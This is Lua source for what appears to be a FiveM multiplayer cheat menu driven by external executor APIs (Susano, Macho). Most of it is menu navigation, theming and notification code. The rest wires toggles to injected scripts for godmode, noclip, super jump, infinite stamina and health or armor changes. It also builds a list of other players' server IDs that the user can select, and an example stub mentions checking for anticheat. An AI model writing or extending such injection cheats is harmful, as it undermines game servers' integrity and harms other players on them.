        if entry.type == "toggle" and entry.data and entry.data.id and (not activeIds[entry.data.id] or entry.name == "**Invalid**") then
            table.remove(self.entries, i)
            if MatrixLua:getCurrentMenu() == self then
                local depth = #MatrixLua.selectedIndex
                local indexData = MatrixLua.selectedIndex[depth]
                if indexData.entryIndex > #self.entries then
                    -- Find first non-divider entry
                    local function findFirstNonDivider(entries)
                        if not entries then return 1 end
                        for i = 1, #entries do
                            if entries[i] and entries[i].type ~= "divider" then
                                return i
                            end
                        end
                        return 1
                    end
                    local firstNonDivider = findFirstNonDivider(self.entries)
                    MatrixLua.selectedIndex[depth].entryIndex = firstNonDivider
                elseif self.entries[indexData.entryIndex] and self.entries[indexData.entryIndex].type == "divider" then
                    -- Current entry is a divider, find next non-divider
                    local function findFirstNonDivider(entries)
                        if not entries then return 1 end
                        for i = 1, #entries do
                            if entries[i] and entries[i].type ~= "divider" then
                                return i
                            end
                        end
                        return 1
                    end
                    local firstNonDivider = findFirstNonDivider(self.entries)
                    MatrixLua.selectedIndex[depth].entryIndex = firstNonDivider
                end
            end
        end
    end

    local existingIds = {}
    for i = 1, #self.entries do
        local entry = self.entries[i]
        if entry.type == "toggle" and entry.data and entry.data.id then
            existingIds[entry.data.id] = true
        end
    end

    local playersToAdd = {}
    local localPed = PlayerPedId()
    local localPos = GetEntityCoords(localPed)
    local localPlayerId = PlayerId()

    for _, playerId in ipairs(GetActivePlayers()) do
        local serverid = GetPlayerServerId(playerId)
        if not existingIds[serverid] then
            local name = GetPlayerName(playerId)
            local playerPed = GetPlayerPed(playerId)
            local playerPos = GetEntityCoords(playerPed)
            local distance = #(localPos - playerPos)
            if playerId == localPlayerId then
                name = "[SELF] " .. name
            end
            table.insert(playersToAdd, {
                serverid = serverid,
                name = name,
                distance = distance
            })
        end
    end

    table.sort(playersToAdd, function(a, b)
        return a.distance < b.distance
    end)

    for _, playerData in ipairs(playersToAdd) do
        local default = self.toggledIds[playerData.serverid] == true

        self:AddToggle(("%s  |  %s"):format(playerData.name, playerData.serverid), function(val)
            self.toggledIds[playerData.serverid] = val
        end, default, { id = playerData.serverid })
    end
end

function Category:GetAllSelectedPlayers()
    local toggled = {}
    self.toggledIds = self.toggledIds or {}
    for i = 1, #self.entries do
        local entry = self.entries[i]
        if entry.type == "toggle" and entry.data and entry.data.id and entry.value then
            table.insert(toggled, entry.data.id)
        end
    end
    return toggled
end

-- MultiMenu metatable
local MultiMenu = {}
MultiMenu.__index = MultiMenu

function Category:NewMultiCategory(label)
    local multiMenu = setmetatable({
        name = label,
        type = "multimenu",
        categories = {}
    }, MultiMenu)
    table.insert(self.entries, multiMenu)
    return multiMenu
end

function MultiMenu:AddCategory(label)
    local cat = setmetatable({ name = label, type = "menu", entries = {} }, Category)
    table.insert(self.categories, cat)
    return cat
end

-- MatrixLua API
function MatrixLua:NewCategory(label)
    local cat = setmetatable({ name = label, type = "menu", entries = {} }, Category)
    table.insert(self.menu.entries, cat)
    return cat
end

function MatrixLua:NewMultiCategory(label)
    local multiMenu = setmetatable({
        name = label,
        type = "multimenu",
        categories = {}
    }, MultiMenu)
    table.insert(self.menu.entries, multiMenu)
    return multiMenu
end

function MatrixLua:getCurrentMenu()
    local menu = self.menu
    local parentMultiMenu = nil

    for i = 1, #self.selectedIndex do
        local indexData = self.selectedIndex[i]
        local idx = indexData.entryIndex

        if menu.type == "multimenu" then
            local subIndex = indexData.subIndex or 1
            if i == #self.selectedIndex then
                parentMultiMenu = menu
            end
            if menu.categories and menu.categories[subIndex] then
                menu = menu.categories[subIndex]
            end
        end

        if i < #self.selectedIndex then
            if menu.entries and menu.entries[idx] then
                local entry = menu.entries[idx]
                menu = entry
            else
                break
            end
        end
    end

    return menu, parentMultiMenu
end

local function stripMenuOfEntries(menu)
    local result = {}
    local entries = {}
    result.name = menu.name
    result.type = menu.type
    if menu.entries then
        for i, entry in ipairs(menu.entries) do
            local copy = {}
            for k, v in pairs(entry) do
                if k ~= "entries" and k ~= "categories" then
                    copy[k] = v
                end
            end
            table.insert(entries, copy)
        end
    end
    result.entries = entries
    return result
end

function MatrixLua:InputBox(title, callback, keybind)
    self.inputbox.enabled = true
    self.inputbox.title = title
    self.inputbox.callback = callback
    self.inputbox.keybind = keybind == true
    self.inputbox.text = ""  -- Reset text when opening input box
    --MachoSendDuiMessage(MatrixLua.dui, json.encode({
    --    event = "popup",
    --    args = self.inputbox
    --}))
end

function MatrixLua:UpdateInputBox(text)
    self.inputbox.text = text
    --MachoSendDuiMessage(MatrixLua.dui, json.encode({
    --    event = "popup_update",
    --    args = self.inputbox
    --}))
end

function MatrixLua:DisableInputbox()
    self.inputbox.enabled = false
    self.inputbox.text = ""
    self.inputbox.callback = nil
    --MachoSendDuiMessage(MatrixLua.dui, json.encode({
    --    event = "popup",
    --    args = self.inputbox
    --}))
end

function MatrixLua:UpdateUI()
    if self.playersMenu then
        pcall(function()
            self.playersMenu:RefreshPlayerToggles()
        end)
    end

    local menu, parentMultiMenu = self:getCurrentMenu()
    local entries = menu.entries
    local depth = #self.selectedIndex
    local indexData = self.selectedIndex[depth]
    local idx = indexData.entryIndex
    local inputbox = self.inputbox

    -- Ensure current entry is not a divider
    if entries and entries[idx] and entries[idx].type == "divider" then
        local function findFirstNonDivider(entries)
            if not entries then return 1 end
            for i = 1, #entries do
                if entries[i] and entries[i].type ~= "divider" then
                    return i
                end
            end
            return 1
        end
        local firstNonDivider = findFirstNonDivider(entries)
        self.selectedIndex[depth].entryIndex = firstNonDivider
        idx = firstNonDivider
    end

    local menu_stripped = stripMenuOfEntries(menu)
    if parentMultiMenu then
        menu_stripped.multiMenuInfo = {
            currentSubIndex = indexData.subIndex,
            totalSubs = #parentMultiMenu.categories,
            subNames = {}
        }
        for i, cat in ipairs(parentMultiMenu.categories) do
            table.insert(menu_stripped.multiMenuInfo.subNames, cat.name)
        end
    end

    if entries and entries[idx] then
        self:RenderUI(menu_stripped, idx, inputbox)
    end
end

function MatrixLua:InitMenu()
    --self.dui = MachoCreateDui("https://alleexxi.github.io/MachoScripts/testing_menu")
    if self.visible then
        --MachoShowDui(self.dui)
    end

    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(150)
            if self.playersMenu then
                pcall(function()
                    self.playersMenu:RefreshPlayerToggles()
                end)
            end
        end
    end)

    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)
            if self.visible then
                MatrixLua:UpdateUI()
            else
                Susano.ResetFrame()
            end
        end
    end)
end

function MatrixLua:onVisibilityChanged(callback)
    if not self.onVisibilityChangedCallbacks then self.onVisibilityChangedCallbacks = {} end

    self.onVisibilityChangedCallbacks[#self.onVisibilityChangedCallbacks + 1] = callback
end

function MatrixLua:setHotkey(hotkey)
    self.hotkey = hotkey
end

function MatrixLua:setVisible(vis)
    self.visible = vis
end

function MatrixLua:addRenderer(func)
    if not self.rendererCallbacks then self.rendererCallbacks = {} end
    self.rendererCallbacks[#self.rendererCallbacks + 1] = func
end

function MatrixLua:RenderUI(menu_stripped, idx, inputbox)
    for _, callback in pairs(self.rendererCallbacks or {}) do
        callback(self, menu_stripped, idx, inputbox)
    end
end

function MatrixLua:handleKeydown(keycode)
    local menu, parentMultiMenu = self:getCurrentMenu()
    local entries = menu.entries
    local depth = #self.selectedIndex
    local indexData = self.selectedIndex[depth]
    local idx = indexData.entryIndex
    local selected = entries[idx]

    local key_input_char = keycode:lower()
    
    -- Helper function to find first non-divider entry
    local function findFirstNonDivider(entries)
        if not entries then return 1 end
        for i = 1, #entries do
            if entries[i] and entries[i].type ~= "divider" then
                return i
            end
        end
        return 1 -- Fallback if all entries are dividers
    end
    
    -- Helper function to find next/previous non-divider entry
    local function findNextNonDivider(entries, currentIdx, direction)
        if not entries then return currentIdx end
        local maxAttempts = #entries
        local attempts = 0
        local newIdx = currentIdx
        
        while attempts < maxAttempts do
            if direction == 1 then -- down
                newIdx = newIdx + 1
                if newIdx > #entries then
                    newIdx = 1
                end
            else -- up
                newIdx = newIdx - 1
                if newIdx < 1 then
                    newIdx = #entries
                end
            end
            
            if entries[newIdx] and entries[newIdx].type ~= "divider" then
                return newIdx
            end
            
            attempts = attempts + 1
        end
        
        -- Fallback: return current index if all entries are dividers
        return currentIdx
    end

    if self.inputbox.enabled then
        if self.inputbox.keybind then
            if key_input_char == "escape" then
                self:DisableInputbox()
                return
            end

            if key_input_char ~= "enter" then
                self:UpdateInputBox(keycode)
            end

            if key_input_char == "enter" then
                if self.inputbox.text ~= "" then
                    if self.inputbox.callback then
                        self.inputbox.callback(self.inputbox.text)
                    end
                end
                self:DisableInputbox()
                return
            end
            return
        else
            -- Normal text input mode
            if key_input_char == "backspace" then
                if self.inputbox.text ~= "" then
                    self:UpdateInputBox(self.inputbox.text:sub(1, -2))
                    return
                end
            end

            if key_input_char == "enter" then
                if self.inputbox.callback then
                    self.inputbox.callback(self.inputbox.text)
                end
                self:DisableInputbox()
                return
            end

            if key_input_char == "escape" then
                self:DisableInputbox()
                return
            end

            local char = keycode

            if key_input_char == "left" or key_input_char == "right" or key_input_char == "up" or key_input_char == "down" or #char ~= 1 then
                return
            end
            
            if LAYOUTS.controlDown and char:lower() == "v" then
                local clipboardText = Susano.GetClipboardText and Susano.GetClipboardText() or ""
                self:UpdateInputBox(self.inputbox.text .. clipboardText)
            else
                self:UpdateInputBox(self.inputbox.text .. char)
            end
            return
        end
    end

    if self.hotkey and self.hotkey == keycode then
        self.visible = not self.visible
        for _, callback in pairs(self.onVisibilityChangedCallbacks or {}) do
            callback(self.visible)
        end
    end

    if not self.visible then
        return
    end

    -- Q/E or A/E navigation for MultiMenu subcategories
    if parentMultiMenu and parentMultiMenu.type == "multimenu" then
        local tabKeys = self.tabSwitchKeys or "QE"
        local prevKey = (tabKeys == "AE") and "a" or "q"
        local nextKey = "e"
        
        if key_input_char == prevKey then
            local subIdx = indexData.subIndex
            if subIdx > 1 then
                self.selectedIndex[depth].subIndex = subIdx - 1
            else
                self.selectedIndex[depth].subIndex = #parentMultiMenu.categories
            end
            -- Helper function to find first non-divider entry
            local function findFirstNonDivider(entries)
                for i = 1, #entries do
                    if entries[i] and entries[i].type ~= "divider" then
                        return i
                    end
                end
                return 1 -- Fallback if all entries are dividers
            end
            local currentCategory = parentMultiMenu.categories[self.selectedIndex[depth].subIndex]
            local firstNonDivider = currentCategory and currentCategory.entries and findFirstNonDivider(currentCategory.entries) or 1
            local currentCategory = parentMultiMenu.categories[self.selectedIndex[depth].subIndex]
            local firstNonDivider = currentCategory and currentCategory.entries and findFirstNonDivider(currentCategory.entries) or 1
            self.selectedIndex[depth].entryIndex = firstNonDivider
            return
        elseif key_input_char == nextKey then
            local subIdx = indexData.subIndex
            if subIdx < #parentMultiMenu.categories then
                self.selectedIndex[depth].subIndex = subIdx + 1
            else
                self.selectedIndex[depth].subIndex = 1
            end
            local currentCategory = parentMultiMenu.categories[self.selectedIndex[depth].subIndex]
            local firstNonDivider = currentCategory and currentCategory.entries and findFirstNonDivider(currentCategory.entries) or 1
            self.selectedIndex[depth].entryIndex = firstNonDivider
            return
        end
    end

    if key_input_char == "up" then
        self.selectedIndex[depth].entryIndex = findNextNonDivider(entries, idx, -1)
    elseif key_input_char == "down" then
        self.selectedIndex[depth].entryIndex = findNextNonDivider(entries, idx, 1)
    elseif key_input_char == "left" then
        if selected.type == "options" then
            local index = entries[idx].index
            if index > 1 then
                entries[idx].index = index - 1
            else
                entries[idx].index = #entries[idx].options
            end
        elseif selected.type == "slider" then
            local settings = selected.settings or {}
            local min = settings.min or 0
            local step = settings.step or 1
            local value = selected.value or min
            value = value - step
            if value < min then value = min end
            entries[idx].value = value
        end
    elseif key_input_char == "right" then
        if selected.type == "options" then
            local index = entries[idx].index
            if index < #entries[idx].options then
                entries[idx].index = index + 1
            else
                entries[idx].index = 1
            end
        elseif selected.type == "slider" then
            local settings = selected.settings or {}
            local max = settings.max or 100
            local step = settings.step or 1
            local value = selected.value or settings.min or 0
            value = value + step
            if value > max then value = max end
            entries[idx].value = value
        end
    elseif key_input_char == "enter" then
        if selected.type == "menu" then
            local subMenu = selected.submenu
            local firstNonDivider = subMenu and subMenu.entries and findFirstNonDivider(subMenu.entries) or 1
            table.insert(self.selectedIndex, { entryIndex = firstNonDivider, subIndex = 1 })
        elseif selected.type == "multimenu" then
            local firstCategory = selected.categories and selected.categories[1]
            local firstNonDivider = firstCategory and firstCategory.entries and findFirstNonDivider(firstCategory.entries) or 1
            table.insert(self.selectedIndex, { entryIndex = firstNonDivider, subIndex = 1 })
        elseif selected.type == "button" and selected.callback then
            selected.callback()
        elseif selected.type == "options" and selected.callback then
            selected.callback(entries[idx].options[entries[idx].index])
        elseif selected.type == "toggle" then
            entries[idx].value = not entries[idx].value
            if selected.callback then
                selected.callback(entries[idx].value)
            end
        elseif selected.type == "slider" and selected.callback then
            selected.callback(selected.value)
        end
    elseif key_input_char == "backspace" then
        if depth > 1 then
            table.remove(self.selectedIndex)
        end
    end
end

LAYOUT:AddCallback(function(key_char)
    MatrixLua:handleKeydown(key_char)
end)

MatrixLua:InitMenu()

-- Example usage
--local playerMultiMenu = MatrixLua:NewMultiCategory("Player")
--
--local playerSelfMenu = playerMultiMenu:AddCategory("Self")
--playerSelfMenu:AddButton("Revive", function()
--    print("Revive")
--    MatrixLua:InputBox("Hey!", function(xd) print(xd) end)
--end)
--playerSelfMenu:AddButton("Heal", function()
--    print("Heal")
--end)
--
--local playerMovement = playerSelfMenu:NewMultiCategory("Movement")
--local freeCam = playerMovement:AddCategory("FreeCam")
--freeCam:AddButton("Test", function()
--    print("Test")
--end)
--
--freeCam:AddToggle("Test Tog", function(val) print(val) end, false)
--
--local noClip = playerMovement:AddCategory("Noclip")
--noClip:AddButton("Test2", function()
--    print("Test2")
--end)
--
--noClip:AddSlider("Hey", 100, 1, 100, 1, function(val)
--    print(val)
--end)
--
--local playerTeleportMenu = playerMultiMenu:AddCategory("Teleport")
--playerTeleportMenu:AddButton("TP to Waypoint", function()
--    print("TP to Waypoint")
--end)
--playerTeleportMenu:AddButton("TP to Player", function()
--    print("TP to Player")
--end)
--
--
--
--local Misc = MatrixLua:NewCategory("Misc")
--Misc:AddButton("Check AC", function()
--end)

MatrixLua:addRenderer(function(self, menu_stripped, idx, inputbox)
    if not self.debug_info then return end
    print("==================== MENU DEBUG ====================")
    print("Menu Name: " .. tostring(menu_stripped.name))
    print("Menu Type: " .. tostring(menu_stripped.type))
    print("Selected Index: " .. tostring(idx))
    print("Total Entries: " .. tostring(#menu_stripped.entries))
    print("Current Depth: " .. tostring(#self.selectedIndex))
    --
    if inputbox.enabled then
        print("\n--- Inputbox Info ---")
        print("Title " .. self.inputbox.title)
        print("Text " .. self.inputbox.text)
        print("")
    end

    if menu_stripped.multiMenuInfo then
        print("\n--- MultiMenu Info ---")
        print("Current Subcategory: " ..
            tostring(menu_stripped.multiMenuInfo.currentSubIndex) ..
            "/" .. tostring(menu_stripped.multiMenuInfo.totalSubs))
        print("Subcategory Names:")
        for i, name in ipairs(menu_stripped.multiMenuInfo.subNames) do
            local marker = (i == menu_stripped.multiMenuInfo.currentSubIndex) and " <-- CURRENT" or ""
            print("  [" .. i .. "] " .. name .. marker)
        end
    end

    print("\n--- Navigation Path ---")
    local pathMenu = self.menu
    for i = 1, #self.selectedIndex do
        local indexData = self.selectedIndex[i]
        local entry = pathMenu.entries and pathMenu.entries[indexData.entryIndex]
        if entry then
            local breadcrumb = string.rep("  ", i - 1) .. entry.name
            if entry.type == "multimenu" and indexData.subIndex then
                local subCat = entry.categories and entry.categories[indexData.subIndex]
                if subCat then
                    breadcrumb = breadcrumb .. " -> " .. subCat.name
                end
            end
            print(breadcrumb)
            if entry.type == "menu" then
                pathMenu = entry
            elseif entry.type == "multimenu" and entry.categories then
                pathMenu = entry.categories[indexData.subIndex]
            end
        end
    end

    print("\n--- Current Menu Entries ---")
    for i, entry in ipairs(menu_stripped.entries) do
        local marker = (i == idx) and " <-- SELECTED" or ""
        local entryInfo = "[" .. i .. "] " .. entry.name .. " (" .. entry.type .. ")"

        if entry.type == "toggle" then
            entryInfo = entryInfo .. " [" .. (entry.value and "ON" or "OFF") .. "]"
        elseif entry.type == "slider" then
            entryInfo = entryInfo .. " [Value: " .. tostring(entry.value) .. "]"
        elseif entry.type == "options" then
            entryInfo = entryInfo .. " [" .. tostring(entry.index) .. "/" .. tostring(#entry.options) .. "]"
            if entry.options and entry.options[entry.index] then
                entryInfo = entryInfo .. " '" .. tostring(entry.options[entry.index]) .. "'"

            end
        end

        print(entryInfo .. marker)
    end

    if menu_stripped.entries[idx] then
        local selected = menu_stripped.entries[idx]
        print("\n--- Selected Entry Details ---")
        print("Name: " .. tostring(selected.name))
        print("Type: " .. tostring(selected.type))
        --
        if selected.type == "toggle" then
            print("Value: " .. tostring(selected.value))
            if selected.data and selected.data.id then
                print("Player ID: " .. tostring(selected.data.id))
            end
        elseif selected.type == "slider" then
            print("Current Value: " .. tostring(selected.value))
            if selected.settings then
                print("Min: " .. tostring(selected.settings.min))
                print("Max: " .. tostring(selected.settings.max))
                print("Step: " .. tostring(selected.settings.step))
            end
        elseif selected.type == "options" then
            print("Current Index: " .. tostring(selected.index))
            print("Total Options: " .. tostring(#selected.options))
            print("Current Option: " .. tostring(selected.options[selected.index]))
            print("All Options:")
            for i, opt in ipairs(selected.options) do
                print("  [" .. i .. "] " .. tostring(opt))
            end
        elseif selected.type == "menu" or selected.type == "multimenu" then
            print("Action: Enter this menu")
        elseif selected.type == "button" then
            print("Action: Execute callback")
        end
    end

    print("====================================================\n")
end)

return MatrixLua
]====])() --un
_G.MENU = MENU
load([======[
local VehicleClasses = {
    [0] = "Compacts",
    [1] = "Sedans",
    [2] = "SUVs",
    [3] = "Coupes",
    [4] = "Muscle",
    [5] = "Sports Classics",
    [6] = "Sports",
    [7] = "Super",
    [8] = "Motorcycles",
    [9] = "Off-road",
    [10] = "Industrial",
    [11] = "Utility",
    [12] = "Vans",
    [13] = "Cycles",
    [14] = "Boats",
    [15] = "Helicopters",
    [16] = "Planes",
    [17] = "Service",
    [18] = "Emergency",
    [19] = "Military",
    [20] = "Commercial",
    [21] = "Trains",
    [22] = "Open Wheel"
}

local VEHICLES = CIST:GetAvailabileVehicles()

local hash_to_name = function(hash)
    for i, v in pairs(Susano.GetAllVehiclesModel()) do
        if v.hash == hash then return v.name end
    end
end

local VehicleSorted = {}
for _, veh in pairs(VEHICLES) do
    local class = GetVehicleClassFromName(veh);

    if not VehicleSorted[class] then VehicleSorted[class] = {} end

    VehicleSorted[class][#VehicleSorted[class] + 1] = hash_to_name(veh)
end

local function ConvertToWeaponHash(weaponName)
    if weaponName == "secret" then return "VEHICLE_WEAPON_MULE4_MG" end
    return "weapon_" .. weaponName:gsub(" ", ""):gsub("MK2", "_mk2"):gsub("%.50", "50"):lower()
end

MENU = MENU or {}
THEME = THEME or {}

-- Initialize SHOW_BANNER to true by default
if _G.SHOW_BANNER == nil then
    _G.SHOW_BANNER = true
end

-- Initialize THEME fonts with default values
if not THEME["Fonts"] then
    THEME["Fonts"] = {}
end
if not THEME["Fonts"]["MenuText"] then
    THEME["Fonts"]["MenuText"] = { "Roboto", "400" }  -- Default font family and weight
end

local THEME_DATA = {
    red = {
        theme = 'red',
        bannerLink = 'https://summer-dust-9c1f.moosezaken.workers.dev/redtheme.png',
        selectedColor = { 200, 0, 0, 180 },
        subMenuBackground = { 200, 0, 0, 180 },
        subMenuBackgroundSelected = { 255, 0, 0, 200 },
        name = 'Red Theme'
    },
    pink = {
        theme = 'pink',
        bannerLink = 'https://summer-dust-9c1f.moosezaken.workers.dev/pinktheme.png',
        selectedColor = { 255, 192, 203, 180 },
        subMenuBackground = { 255, 192, 203, 180 },
        subMenuBackgroundSelected = { 255, 182, 193, 200 },
        name = 'Pink Theme'
    },
    trump = {
        theme = 'trump',
        bannerLink = 'https://summer-dust-9c1f.moosezaken.workers.dev/trump.png',
        selectedColor = { 255, 255, 255, 180 },
        subMenuBackground = { 255, 255, 255, 180 },
        subMenuBackgroundSelected = { 240, 240, 240, 200 },
        name = 'Trump Theme'
    },
    green = {
        theme = 'green',
        bannerLink = 'https://summer-dust-9c1f.moosezaken.workers.dev/greentheme.png',
        selectedColor = { 0, 200, 140, 180 },
        subMenuBackground = { 0, 200, 140, 180 },
        subMenuBackgroundSelected = { 0, 220, 160, 200 },
        name = 'Green Theme'
    }
}

local function ApplyTheme(themeName)
    local theme = THEME_DATA[themeName]
    if not theme then return end
    
    -- Ensure fonts are initialized
    if not THEME["Fonts"] then
        THEME["Fonts"] = {}
    end
    if not THEME["Fonts"]["MenuText"] then
        THEME["Fonts"]["MenuText"] = { "Roboto", "400" }
    end
    
    THEME["SelectedColor"] = theme.selectedColor
    THEME["SubMenuBackground"] = theme.subMenuBackground
    THEME["SubMenuBackgroundSelected"] = theme.subMenuBackgroundSelected
    
    local HTTPGET = HTTPGET or function(url)
        local st, body = Susano.HttpGet(url)
        return body
    end
    
    -- Only load banner if Show Banner toggle is enabled (default is true)
    if (_G.SHOW_BANNER == nil or _G.SHOW_BANNER == true) and Susano.LoadTextureFromBuffer then
        -- Try to load banner synchronously first
        local bannerData = HTTPGET(theme.bannerLink)
        if bannerData and bannerData ~= "" and #bannerData > 0 then
            if not THEME["Banners"] then THEME["Banners"] = {} end
            THEME["Banners"][1] = Susano.LoadTextureFromBuffer(bannerData)
            _G.SELECTEDBANNER = 1
        else
            -- If sync fails, try async
            CreateThread(function()
                Wait(200)  -- Wait a bit for network
                local bannerData = HTTPGET(theme.bannerLink)
                if bannerData and bannerData ~= "" and #bannerData > 0 then
                    if not THEME["Banners"] then THEME["Banners"] = {} end
                    THEME["Banners"][1] = Susano.LoadTextureFromBuffer(bannerData)
            _G.SELECTEDBANNER = 1
                end
            end)
        end
    else
        -- Clear banner if toggle is off
        if THEME["Banners"] then
            THEME["Banners"][1] = nil
        end
        _G.SELECTEDBANNER = nil
    end
end

-- Apply red theme as default
CreateThread(function()
    Wait(100)  -- Wait a bit for everything to initialize
    ApplyTheme("red")
end)
ApplyTheme("red")  -- Also apply immediately

local NOTIFICATIONS = {}
local notificationIdCounter = 0

-- ScreenScale function to scale values based on screen resolution
function ScreenScale(value)
    if not value then return 0 end
    local ScreenWidth, ScreenHeight = GetActiveScreenResolution()
    if not ScreenWidth then return value end
    local baseWidth = 1920
    local scale = ScreenWidth / baseWidth
    return value * scale
end

function ShowNotification(title, desc, notificationType, duration)
    if not title then return end
    
    notificationType = notificationType or "success"
    duration = duration or 5000
    
    notificationIdCounter = notificationIdCounter + 1
    
    local notification = {
        title = tostring(title) or "Notification",
        desc = tostring(desc) or "",
        type = notificationType,
        startTime = GetGameTimer(),
        duration = duration,
        id = notificationIdCounter
    }
    
    table.insert(NOTIFICATIONS, notification)
    
    -- Clean up after duration
    CreateThread(function()
        Wait(duration + 100)
        for i = #NOTIFICATIONS, 1, -1 do
            if NOTIFICATIONS[i] and NOTIFICATIONS[i].id == notification.id then
                table.remove(NOTIFICATIONS, i)
                break
            end
        end
    end)
end

local function RenderNotifications()
    if not Susano then return end
    if #NOTIFICATIONS == 0 then return end
    
    local ScreenWidth, ScreenHeight = GetActiveScreenResolution()
    if not ScreenWidth or not ScreenHeight then return end
    
    -- Initialize fonts
    if not THEME then THEME = {} end
    if not THEME["Fonts"] then THEME["Fonts"] = {} end
    if not THEME["Fonts"]["MenuText"] then
        THEME["Fonts"]["MenuText"] = { "Roboto", "400" }
    end
    
    local MenuFont = THEME["Fonts"]["MenuText"]
    if not MenuFont or not MenuFont[1] or not MenuFont[2] then
        MenuFont = { "Roboto", "400" }
        THEME["Fonts"]["MenuText"] = MenuFont
    end
    
    -- Clean up expired notifications first
    local currentTime = GetGameTimer()
    for i = #NOTIFICATIONS, 1, -1 do
        local notif = NOTIFICATIONS[i]
        if notif and notif.startTime then
            local elapsed = currentTime - notif.startTime
            if elapsed >= notif.duration then
                table.remove(NOTIFICATIONS, i)
            end
        else
            table.remove(NOTIFICATIONS, i)
        end
    end
    
    if #NOTIFICATIONS == 0 then return end
    
    local function ToColorLocal(tbl)
        if not tbl then return 0, 0, 0, 0 end
        local r = (tbl[1] or 0) / 255
        local g = (tbl[2] or 0) / 255
        local b = (tbl[3] or 0) / 255
        local a = (tbl[4] or 255) / 255
        return r, g, b, a
    end
    
    local notificationWidth = ScreenScale(350)
    local notificationHeight = ScreenScale(50)
    local spacing = ScreenScale(8)
    local padding = ScreenScale(20)
    local startX = ScreenWidth - notificationWidth - padding
    local startY = ScreenScale(100)
    local rounding = ROUNDING or ScreenScale(22)
    
    for i, notif in ipairs(NOTIFICATIONS) do
        if notif and notif.startTime then
            local elapsed = currentTime - notif.startTime
            if elapsed < notif.duration then
                local progress = elapsed / notif.duration
                local alpha = 1.0
                
                if progress > 0.9 then
                    alpha = 1.0 - ((progress - 0.9) / 0.1)
                end
                
                alpha = math.max(0, math.min(1, alpha))
                local yPos = startY + ((i - 1) * (notificationHeight + spacing))
                
                local bgColor = THEME["backgroundTransparent"] or { 64, 64, 64, 180 }
                local bgR, bgG, bgB, bgA = ToColorLocal(bgColor)
                bgA = bgA * alpha
                
                local textColor = THEME["TextColor"] or { 255, 255, 255, 255 }
                local textR, textG, textB, textA = ToColorLocal(textColor)
                textA = textA * alpha
                
                local selectedColor = THEME["SelectedColor"] or { 242, 141, 241, 180 }
                local accentR, accentG, accentB, accentA = ToColorLocal(selectedColor)
                accentA = accentA * alpha
                
                if notif.type == "success" then
                    accentR, accentG, accentB = 0.0, 0.8, 0.0
                elseif notif.type == "error" then
                    accentR, accentG, accentB = 0.8, 0.0, 0.0
                elseif notif.type == "warning" then
                    accentR, accentG, accentB = 0.8, 0.8, 0.0
                elseif notif.type == "info" then
                    accentR, accentG, accentB = ToColorLocal(selectedColor)
                end
                
                if Susano.DrawRoundedFilledRect then
                    Susano.DrawRoundedFilledRect(rounding - ScreenScale(2), startX, yPos, notificationWidth, notificationHeight,
                        bgR, bgG, bgB, bgA, true, true, true, true)
                    
                    local accentWidth = ScreenScale(4)
                    Susano.DrawRoundedFilledRect(rounding - ScreenScale(2), startX, yPos, accentWidth, notificationHeight,
                        accentR, accentG, accentB, accentA, true, false, true, false)
                end
                
                if Susano.DrawTextWithFont then
                    local textSize = THEME["MenuEntryTextSize"] or ScreenScale(18)
                    local textY = yPos + (notificationHeight / 2) - (textSize / 2)
                    local displayText = tostring(notif.title) or "Notification"
                    if notif.desc and notif.desc ~= "" then
                        displayText = displayText .. " - " .. tostring(notif.desc)
                    end
                    Susano.DrawTextWithFont(startX + ScreenScale(20), textY, displayText,
                        MenuFont[1], MenuFont[2], textSize, textR, textG, textB, textA)
                end
            end
        end
    end
end

-- Always render notifications - both when menu is visible and not visible
CreateThread(function()
    while true do
        Wait(0)
        if #NOTIFICATIONS > 0 then
            if Susano and Susano.BeginFrame then
                Susano.BeginFrame()
                RenderNotifications()
                if Susano.SubmitFrame then
                    Susano.SubmitFrame()
                end
            end
        end
    end
end)

-- Also render when menu is visible
MENU:addRenderer(function(self, menu, idx, inputbox)
    RenderNotifications()
end)

-- ShowNotification is now global

local playerMultiMenu = MENU:NewMultiCategory("Player")
local playerSelfMenu = playerMultiMenu:AddCategory("Self")

playerSelfMenu:AddToggle("Super Jump", function(val)
    Utils.InjectScript("superJump", nil, val)
    if ShowNotification then ShowNotification("Super Jump", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

playerSelfMenu:AddToggle("Infinite Stamina", function(val)
    Utils.InjectScript("infiniteStamina", nil, val)
    if ShowNotification then ShowNotification("Infinite Stamina", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

playerSelfMenu:AddDivider("Health")

playerSelfMenu:AddToggle("Godmode", function(val)
    Utils.InjectScript("setGodmode", nil, val)
    if ShowNotification then ShowNotification("Godmode", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

local maxHealth = (GetEntityMaxHealth(PlayerPedId()) - 100) or 100
playerSelfMenu:AddSlider("Health", maxHealth, 0, maxHealth, 5, function(val)
    Utils.InjectScript("setHealth", nil, 100 + val)
    if ShowNotification then ShowNotification("Health", "Health set to " .. (100 + val), "success", 2000) end
end)

playerSelfMenu:AddSlider("Armor", 100, 0, 100, 10, function(val)
    Utils.InjectScript("setArmor", nil, val)
    if ShowNotification then ShowNotification("Armor", "Armor set to " .. val, "success", 2000) end
end)

playerSelfMenu:AddButton("Suicide", function()
    Utils.InjectScript("suicide")
    if ShowNotification then ShowNotification("Suicide", "Player killed", "warning", 2000) end
end)

playerSelfMenu:AddButton("Native Revive", function()
    Utils.InjectScript("nativeRevive")
    if ShowNotification then ShowNotification("Revive", "Native revive executed", "success", 2000) end
end)

playerSelfMenu:AddButton("Framework Revive", function()
    Utils.InjectScript("frameworkRevive")
    if ShowNotification then ShowNotification("Framework Revive", "Revived using framework", "success", 2000) end
end)

playerSelfMenu:AddButton("Refill Health", function()
    Utils.InjectScript("refillHealth")
    if ShowNotification then ShowNotification("Refill Health", "Health refilled to maximum", "success", 2000) end
end)

playerSelfMenu:AddButton("Refill Armor", function()
    Utils.InjectScript("refillArmor")
    if ShowNotification then ShowNotification("Refill Armor", "Armor refilled to maximum", "success", 2000) end
end)

local playerMovementMenu = playerMultiMenu:AddCategory("Movement")

playerMovementMenu:AddToggle("Noclip", function(val)
    Utils.InjectScript("toggleNoclip", nil, val)
    ShowNotification("Noclip", val and "Enabled" or "Disabled", val and "success" or "info", 2000)
end, false)

playerMovementMenu:AddSlider("Noclip Speed", 1, 1, 10, 1, function(val)
    Utils.InjectScript("setNoclipSpeed", nil, val)
    if ShowNotification then ShowNotification("Noclip Speed", "Speed set to " .. val, "success", 2000) end
end)

